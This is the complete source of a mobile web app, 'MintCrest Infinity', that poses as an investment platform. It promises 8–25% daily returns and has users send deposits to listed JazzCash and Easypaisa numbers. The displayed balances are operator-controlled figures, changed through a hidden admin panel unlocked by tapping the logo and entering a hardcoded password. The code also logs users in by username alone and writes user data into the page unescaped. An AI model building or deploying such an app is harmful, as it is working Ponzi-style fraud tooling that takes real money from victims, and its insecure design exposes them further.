<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>MintCrest Infinity | Global Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; margin: 0; overflow: hidden; }
        
        /* Smooth Layout */
        .app-shell { height: 100vh; overflow-y: auto; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; padding-bottom: 120px; }
        ::-webkit-scrollbar { display: none; }
        
        /* Glassmorphism Elements */
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-blue { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        
        /* Animations */
        .page { display: none; }
        .active-page { display: block; animation: slideUp 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .nav-btn { transition: 0.3s; opacity: 0.4; }
        .nav-active { opacity: 1; color: #6fb1fc; transform: translateY(-5px); }
        
        /* Marquee Ticker */
        .marquee-wrap { background: rgba(30, 58, 138, 0.4); padding: 8px 0; overflow: hidden; white-space: nowrap; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .marquee { display: inline-block; animation: scroll 20s linear infinite; font-size: 10px; font-weight: 900; color: #60a5fa; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        
        input, select { outline: none; transition: 0.3s; }
        input:focus { border-color: #4364f7 !important; background: rgba(255,255,255,0.05) !important; }
    </style>
</head>
<body>

    <div id="ticker-wrap" class="hidden fixed top-0 w-full z-[1000] marquee-wrap">
        <div class="marquee" id="ticker-text">🚀 MINTCREST: 10% TAX ON WITHDRAWALS — SYSTEM OPERATIONAL — CONTACT SUPPORT FOR ASSISTANCE 🚀</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#010409] flex flex-col items-center justify-center p-8 text-center">
        <div class="w-20 h-20 grad-blue rounded-[2rem] mb-6 flex items-center justify-center text-3xl shadow-2xl animate-pulse">💎</div>
        <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2">MINTCREST</h1>
        <p class="text-[8px] uppercase tracking-[0.4em] text-gray-500 font-bold mb-10">Global Asset Management</p>
        <div class="glass p-10 rounded-[3.5rem] w-full max-w-sm">
            <input type="text" id="user-name" placeholder="Username" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10 text-white">
            <input type="text" id="ref-by" placeholder="Invite ID (Optional)" class="w-full bg-white/5 p-3 rounded-xl mb-6 text-[10px] text-center border border-white/5">
            <button onclick="login()" class="w-full grad-blue py-5 rounded-2xl font-black uppercase text-[10px] tracking-widest">Connect Node</button>
        </div>
    </section>

    <main id="app-ui" class="hidden app-shell pt-12">
        
        <div id="p-home" class="page active-page p-6">
            <div class="grad-blue p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="flex justify-between items-start mb-6">
                    <div>
                        <p class="text-[9px] text-white/60 font-black uppercase">Main Wallet</p>
                        <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                    </div>
                    <button onclick="logout()" class="bg-black/20 p-3 rounded-2xl">🚀</button>
                </div>
                <div id="countdown-display" class="text-[9px] font-black bg-black/30 px-4 py-2 rounded-full inline-block">SECURE NODE</div>
                <div class="mt-8 flex justify-between items-center border-t border-white/10 pt-4">
                    <div><p class="text-[8px] opacity-60 font-bold">TOTAL PROFIT</p><p class="text-lg font-black" id="v-profit">₨ 0</p></div>
                    <span id="rank-badge" class="text-[8px] bg-white/10 px-3 py-1 rounded-full font-black uppercase">Standard</span>
                </div>
            </div>

            <div class="glass p-5 rounded-[2.5rem] mb-6">
                <p class="text-[10px] font-black uppercase text-yellow-500 mb-3">🏆 Top Gainers</p>
                <div id="leaderboard" class="space-y-2"></div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500">📥 <span class="text-[10px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500">📤 <span class="text-[10px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>

            <button onclick="reqAction('Daily Bonus Request', 0)" class="w-full grad-gold p-6 rounded-[2.5rem] flex justify-between items-center">
                <div class="text-left"><p class="text-[11px] font-black uppercase">Daily Dividends</p><p class="text-[8px] opacity-60 font-bold uppercase">Claim yield manually</p></div>
                <span class="text-2xl">🎁</span>
            </button>
        </div>

        <div id="p-invest" class="page p-6">
            <h3 class="text-center font-black text-xl mb-8 uppercase italic">Fleet Activation</h3>
            <div id="plans-list" class="space-y-3 pb-20"></div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <h3 class="text-center font-black text-xl mb-8 uppercase italic">Payout Portal</h3>
            <div class="glass p-8 rounded-[3.5rem]">
                <input type="number" id="w-amt" oninput="calcTax()" placeholder="Amount (Min 500)" class="w-full bg-white/5 p-5 rounded-2xl mb-2 text-center font-bold border border-white/10">
                <p id="tax-info" class="text-[9px] text-center mb-6 font-bold text-red-400">Tax (10%): ₨ 0 | You Get: ₨ 0</p>
                
                <select id="w-method" class="w-full bg-black/50 p-4 rounded-2xl mb-4 text-[10px] font-bold border border-white/10">
                    <option value="Easypaisa">Easypaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Binance USDT">Binance USDT</option>
                </select>
                <input type="text" id="w-acc" placeholder="Account Number / Name" class="w-full bg-white/5 p-4 rounded-2xl mb-6 text-center text-[11px] border border-white/10">
                <button onclick="subWd()" class="w-full grad-blue py-6 rounded-3xl font-black uppercase text-[10px]">Verify & Withdraw</button>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black text-xl mb-8 uppercase italic">Capital Upload</h3>
            <div class="glass p-6 rounded-[2.5rem] mb-6 space-y-3 text-[10px] font-black uppercase">
                <div class="flex justify-between items-center"><span>JazzCash</span><b class="text-blue-400">03705519562</b></div>
                <div class="flex justify-between items-center"><span>Easypaisa</span><b class="text-green-400">03379827882</b></div>
            </div>
            <div class="glass p-8 rounded-[3.5rem]">
                <input type="number" id="d-amt" placeholder="Deposit Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 border border-white/10 text-center font-bold">
                <input type="text" id="d-tid" placeholder="TID Number" class="w-full bg-white/5 p-4 rounded-xl mb-4 border border-white/10 text-center font-bold uppercase">
                <input type="file" id="d-file" class="w-full text-[10px] mb-6">
                <button id="dep-btn" onclick="subDep()" class="w-full grad-blue py-5 rounded-2xl font-black uppercase text-[10px]">Upload Proof</button>
            </div>
        </div>

        <div id="p-history" class="page p-6"><h3 class="font-black text-xl mb-8 uppercase text-center italic">Node Records</h3><div id="user-history" class="space-y-4"></div></div>

        <div id="p-more" class="page p-6">
            <div class="glass p-8 rounded-[3rem] mb-6 border-l-8 border-blue-500">
                <h3 class="text-[10px] font-black uppercase text-blue-400 mb-2">Invite Link</h3>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly class="flex-1 bg-white/5 p-3 rounded-xl text-[9px] border border-white/10">
                    <button onclick="copyRef()" class="bg-blue-600 px-5 rounded-xl font-black text-[9px]">COPY</button>
                </div>
            </div>
            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-[10px] font-black uppercase text-center mb-4 italic">Direct Support</h3>
                <textarea id="support-msg" class="w-full bg-white/5 p-4 rounded-xl text-[10px] mb-4 h-24 border border-white/10" placeholder="Type your issue..."></textarea>
                <button onclick="sendSupport()" class="w-full grad-blue py-3 rounded-xl font-black text-[10px] uppercase">Send Message</button>
            </div>
        </div>

    </main>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 w-full z-[2000] rounded-t-[4rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn nav-active text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('history')" id="n-history" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="nav-btn text-2xl">💬</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[50000] hidden overflow-y-auto">
        <div class="p-8 border-b border-white/10 flex justify-between items-center sticky top-0 bg-[#000814]/95 backdrop-blur-xl">
            <h2 class="text-xl font-black text-blue-500 italic uppercase">Core Override</h2>
            <button onclick="closeAdm()" class="bg-red-600 px-5 py-2 rounded-xl text-[9px] font-black">EXIT</button>
        </div>
        <div class="p-6">
            <div class="grid grid-cols-3 gap-2 mb-8">
                <button onclick="showTab('reqs')" class="grad-blue py-3 rounded-xl text-[8px] font-black">REQS</button>
                <button onclick="showTab('users')" class="glass py-3 rounded-xl text-[8px] font-black">USERS</button>
                <button onclick="showTab('msgs')" class="bg-purple-600 py-3 rounded-xl text-[8px] font-black">INBOX</button>
            </div>
            
            <div id="tab-reqs" class="adm-tab space-y-4"></div>
            <div id="tab-users" class="adm-tab hidden space-y-2"></div>
            <div id="tab-msgs" class="adm-tab hidden space-y-2"></div>
            
            <div class="mt-10 glass p-8 rounded-[3rem]">
                <h4 class="text-[10px] font-black text-blue-400 mb-4 uppercase text-center">Admin Controls</h4>
                <input type="text" id="adm-target" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] border border-white/10">
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="manualAdj('balance')" class="bg-blue-600 py-3 rounded-xl text-[8px] font-black uppercase">Add Balance</button>
                    <button onclick="manualAdj('profit')" class="bg-cyan-600 py-3 rounded-xl text-[8px] font-black uppercase">Add Profit</button>
                </div>
                <textarea id="adm-bc" class="w-full bg-white/5 p-4 rounded-xl text-[10px] mt-6 border border-white/10" placeholder="New Marquee Text..."></textarea>
                <button onclick="setBC()" class="w-full grad-blue py-3 rounded-xl mt-2 font-black text-[9px] uppercase">Update Marquee</button>
            </div>
        </div>
    </div>

    <script>
        // CONFIG
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Startup Node", p: 500, r: 8 }, { n: "Bronze Master", p: 1500, r: 10 }, { n: "Silver Pro", p: 5000, r: 12 },
            { n: "Gold Infinity", p: 15000, r: 15 }, { n: "Diamond Vault", p: 50000, r: 20 }, { n: "Elite P1", p: 100000, r: 25 }
        ];

        // SESSION CHECK
        window.onload = () => {
            const saved = localStorage.getItem('mint_v38_session');
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateTimers, 1000);
        };

        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase(); if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) {
                const r = document.getElementById('ref-by').value.trim().toLowerCase() || 'Direct';
                await ref.set({ name: n, balance: 0, profit: 0, refBy: r, time: Date.now(), status: 'active', activeTier: 0, lastYield: Date.now() });
            }
            localStorage.setItem('mint_v38_session', n);
            document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden'); document.getElementById('ref-link').value = n;
            syncData(n); renderPlans(); renderLeaderboard();
        }

        function syncData(n) {
            db.collection("users").doc(n).onSnapshot(d => {
                user = d.data(); if(user.status === 'banned') { alert("Banned! 😘"); logout(); }
                document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
                document.getElementById('v-profit').innerText = "₨ " + (user.profit||0).toLocaleString();
                document.getElementById('rank-badge').innerText = user.balance >= 50000 ? "Diamond Rank" : (user.balance >= 10000 ? "Gold Rank" : "Standard");
            });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(doc => { const x = doc.data(); l.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between border-l-4 ${x.status==='approved'?'border-green-500':'border-yellow-500'}"><div class="text-[9px] font-black uppercase">${x.type}<br><span class="opacity-30 text-[7px]">${new Date(x.time).toLocaleTimeString()}</span></div><div class="text-right text-[10px] font-black">₨ ${x.amount}<br><span class="text-[8px]">${x.status}</span></div></div>`; });
            });
            db.collection("settings").doc("marquee").onSnapshot(d => { if(d.exists) { document.getElementById('ticker-wrap').classList.remove('hidden'); document.getElementById('ticker-text').innerText = d.data().msg; } });
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => { l.innerHTML += `<div onclick="buyPlan(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center border-b-2 border-white/5"><div><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-blue-400 font-bold uppercase">${p.r}% Daily</p></div><div class="text-lg font-black italic">₨ ${p.p.toLocaleString()}</div></div>`; });
        }

        function calcTax() {
            const a = parseInt(document.getElementById('w-amt').value) || 0;
            const t = Math.floor(a * 0.10); const r = a - t;
            document.getElementById('tax-info').innerText = `Tax (10%): ₨ ${t} | You Get: ₨ ${r}`;
        }

        async function buyPlan(p, roi, name) {
            if(user.balance < p) return alert("Low Balance, Sweetie! 😘");
            if(confirm("Activate "+name+"?")) {
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, lastYield: Date.now() });
                await db.collection("requests").add({ user: user.name, amount: p, type: "Plan Activation", status: "approved", time: Date.now() });
                alert("Node Active! 😘");
            }
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a < 500 || a > user.balance || !acc) return alert("Check Balance & Details! 😘");
            const tax = Math.floor(a * 0.10); const rec = a - tax;
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, tax: tax, receive: rec, acc: acc, method: document.getElementById('w-method').value, type: "Withdrawal", status: "pending", time: Date.now() });
            alert("Withdrawal Logged! (10% Tax Applied) 😘"); changePage('home');
        }

        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("Incomplete Details! 😘");
            const b = document.getElementById('dep-btn'); b.innerText = "UPLOADING..."; b.disabled = true;
            try {
                const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f); const url = await sRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
                alert("Request Sent! 😘"); changePage('home');
            } catch(e) { alert("Check Permissions!"); }
            b.innerText = "Upload Proof"; b.disabled = false;
        }

        async function reqAction(t, a) { await db.collection("requests").add({ user: user.name, amount: a, type: t, status: "pending", time: Date.now() }); alert("Logged! 😘"); }
        async function sendSupport() { const m = document.getElementById('support-msg').value; if(!m) return; await db.collection("support").add({ user: user.name, message: m, time: Date.now() }); alert("Sent! 😘"); document.getElementById('support-msg').value=''; }

        // ADMIN FUNCTIONS
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Pass:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('tab-'+t).classList.remove('hidden'); }

        async function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const rl = document.getElementById('tab-reqs'); rl.innerHTML = '';
                s.forEach(doc => {
                    const x = doc.data();
                    rl.innerHTML += `<div class="glass p-6 rounded-3xl text-[10px] mb-4">
                        <p class="font-black text-blue-400 uppercase">${x.user} - ${x.type}</p>
                        ${x.type==='Withdrawal' ? `<p class="text-red-400">PAY: ₨ ${x.receive} (Tax: ${x.tax})</p><p>Acc: ${x.acc} (${x.method})</p>` : `<p>Amount: ₨ ${x.amount}</p>`}
                        ${x.proof ? `<a href="${x.proof}" target="_blank" class="block text-center py-2 bg-blue-600 rounded-xl my-3 font-bold">IMAGE</a>` : ''}
                        <div class="flex gap-2"><button onclick="hnd('${doc.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 bg-green-600 py-3 rounded-xl font-bold">OK</button>
                        <button onclick="hnd('${doc.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-red-600 py-3 rounded-xl font-bold">X</button></div>
                    </div>`;
                });
            });
            db.collection("users").onSnapshot(s => {
                const ul = document.getElementById('tab-users'); ul.innerHTML = '';
                s.forEach(doc => { const u = doc.data(); ul.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[9px] font-bold"><span>${u.name} (₨ ${u.balance})</span><button onclick="banUser('${doc.id}')" class="text-red-500">BAN</button></div>`; });
            });
            db.collection("support").orderBy("time", "desc").onSnapshot(s => {
                const ml = document.getElementById('tab-msgs'); ml.innerHTML = '';
                s.forEach(doc => { const m = doc.data(); ml.innerHTML += `<div class="glass p-4 rounded-xl text-[9px] mb-2 font-bold"><p class="text-purple-400 uppercase">${m.user}</p><p>${m.message}</p></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') {
                if(type === "Daily Bonus Request") { const b = parseInt(prompt("Amount:")); await ref.update({ balance: d.data().balance + b }); }
                if(type === "Deposit") await ref.update({ balance: d.data().balance + amt });
            } else if(act==='rejected' && type === 'Withdrawal') { await ref.update({ balance: d.data().balance + amt }); }
            await db.collection("requests").doc(id).update({ status: act });
        }

        async function setBC() { const m = document.getElementById('adm-bc').value; await db.collection("settings").doc("marquee").set({ msg: m }); alert("Updated! 😘"); }
        async function manualAdj(f) { const u = document.getElementById('adm-target').value.toLowerCase(); const v = parseInt(prompt("Amount:")); await db.collection("users").doc(u).update({ [f]: firebase.firestore.FieldValue.increment(v) }); alert("Done! 😘"); }
        async function banUser(id) { if(confirm("Ban?")) await db.collection("users").doc(id).update({ status: 'banned' }); }
        
        function updateTimers() {
            if (user && user.activeTier > 0) {
                const diff = (user.lastYield + 86400000) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000); const m = Math.floor((diff%3600000)/60000); const s = Math.floor((diff%60000)/1000);
                    document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}:${m}:${s}`;
                } else { document.getElementById('countdown-display').innerText = "YIELD READY"; }
            }
        }

        function logout() { localStorage.removeItem('mint_v38_session'); location.reload(); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('nav-active')); document.getElementById('n-'+p).classList.add('nav-active'); }
        function copyRef() { navigator.clipboard.writeText(user.name); alert("ID Copied! 😘"); }
        async function renderLeaderboard() { db.collection("users").orderBy("balance", "desc").limit(5).onSnapshot(s => { const l = document.getElementById('leaderboard'); l.innerHTML = ''; let r=1; s.forEach(doc => { const u = doc.data(); l.innerHTML += `<div class="flex justify-between text-[10px] font-bold opacity-60"><span>${r}. ${u.name.toUpperCase()}</span><span>₨ ${u.balance.toLocaleString()}</span></div>`; r++; }); }); }
    </script>
</body>
</html>
